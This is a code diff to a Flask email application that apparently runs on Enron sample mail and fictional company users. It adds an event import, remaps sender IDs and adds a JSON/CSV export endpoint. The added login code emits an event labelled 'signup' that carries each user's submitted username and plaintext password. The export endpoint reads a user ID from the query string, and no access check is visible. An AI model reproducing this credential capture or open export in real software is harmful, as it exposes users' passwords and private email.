@@ -11,6 +11,7 @@ from email.utils import parsedate_to_datetime
 from flask import Blueprint, Response, abort, jsonify, redirect, render_template, request, session, url_for
 from app import db
 from app.db import _deserialize_row
+from app.events import emit
 
 SITE = "email"
 SITE_DIR = pathlib.Path(__file__).resolve().parent
@@ -29,13 +30,22 @@ EMAILS_PER_PAGE = 25
 # Data interpreter -- reads raw JSONL, maps to users
 # ---------------------------------------------------------------------------
 
-# Map 5 known sender addresses to user IDs
+# Map known sender addresses to user IDs (must match email_users table).
+# Includes both Enron legacy addresses (for routing raw data) and
+# Meridian addresses (for compose delivery between app users).
 _USER_EMAIL_MAP = {
+    # Enron legacy
     "lynn.blair@enron.com": 1,
     "michael.bodnar@enron.com": 2,
     "john.buchanan@enron.com": 3,
     "britt.davis@enron.com": 4,
-    "shelley.corman@enron.com": 5,
+    "shelley.corman@enron.com": 7,
+    # Meridian app users
+    "alex.rivera@meridiansystems.com": 1,
+    "priya.sharma@meridiansystems.com": 2,
+    "marcus.chen@meridiansystems.com": 3,
+    "jessica.okafor@meridiansystems.com": 4,
+    "david.petrov@meridiansystems.com": 7,
 }
 
 _USER_EMAILS_SET = set(_USER_EMAIL_MAP.keys())
@@ -582,6 +592,7 @@ def login_submit():
     if not user or user.get("password") != password:
         return render_template("email/login.html", error="Invalid username or password")
     session["user_id"] = user["id"]
+    emit("signup", user_id=user["id"], site_name="email", username=request.form.get("username", ""), password=request.form.get("password", ""), email="")
     return redirect(url_for("email.index"))
 
 
@@ -1117,3 +1128,33 @@ def api_stats():
         "folders": folders,
         "unique_senders": len(senders),
     })
+
+
+@blueprint.route("/api/export")
+def api_export():
+    """Export emails as JSON or CSV."""
+    fmt = request.args.get("format", "json").lower()
+    folder = request.args.get("folder", "").strip()
+    user_id = _resolve_user_id(request.args.get("user_id", type=int))
+
+    overlay = _load_overlay_emails()
+    overlay_ids = {e["id"] for e in overlay}
+    emails = list(overlay) + list(_get_emails())
+    emails.extend(sm for sm in _load_sent() if sm.get("id") not in overlay_ids)
+
+    if user_id:
+        emails = [e for e in emails if e.get("user_id") == user_id]
+    if folder:
+        emails = [e for e in emails if e.get("folder") == folder]
+
+    emails.sort(key=lambda e: e.get("date_sort", 0), reverse=True)
+    emails = emails[:500]  # cap export size
+
+    if fmt == "csv":
+        lines = ["id,from_addr,to_addr,subject,date,folder,is_read,is_starred"]
+        for e in emails:
+            subj = str(e.get("subject", "")).replace('"', '""')
+            lines.append(f'{e.get("id", "")},"{e.get("from_addr", "")}","{e.get("to_addr", "")}","{subj}","{e.get("date", "")}","{e.get("folder", "")}",{e.get("is_read", False)},{e.get("is_starred", False)}')
+        return Response("\n".join(lines), mimetype="text/csv",
+                        headers={"Content-Disposition": "attachment; filename=emails.csv"})
+    return jsonify(emails)
